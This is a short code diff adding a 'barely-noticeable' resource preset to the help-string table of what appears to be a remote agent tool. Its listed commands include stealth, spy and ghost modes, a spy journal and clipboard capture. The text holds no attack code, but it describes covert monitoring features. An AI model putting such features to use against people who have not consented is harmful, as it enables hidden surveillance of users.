@@ -136,6 +136,7 @@ var Known = map[string]string{
 	"get-agent-debug-log":      "Pull remote verbose log - get-agent-debug-log [lines]",
 	"get-mode":                 "Show agent operation mode",
 	"agent-limits":             "Get/set agent resource limits - agent-limits [cpu=PCT] [mem=MB] [prio=idle|below|normal] [clear]",
+	"limit-agent":              "Barely-noticeable preset - limit-agent quiet (cpu=5 mem=256 prio=idle); all agent-limits args work too",
 	"set-mode":                 "Set agent operation mode - set-mode <normal|stealth|spy|ghost|performance|kiosk|audit> (restarts agent)",
 	"get-spy-log":              "Pull spy journal tail - get-spy-log [lines] (spy mode)",
 	"spy-clipboard":            "Toggle spy clipboard capture - spy-clipboard on|off",
